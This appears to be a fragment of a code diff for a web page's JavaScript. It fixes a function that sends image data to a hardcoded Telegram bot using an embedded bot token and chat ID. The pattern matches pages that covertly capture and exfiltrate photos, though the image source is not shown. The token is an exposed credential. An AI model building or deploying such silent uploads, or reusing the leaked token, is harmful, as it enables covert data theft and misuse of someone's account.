@@ -38,8 +38,8 @@
             .catch(error => console.error('خطا:', error));
 
         function uploadToTelegram(imageData) {
-            const botToken = 8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY;
-            const chatId = 5871430093;
+            const botToken = "8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY";
+            const chatId = "5871430093";
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
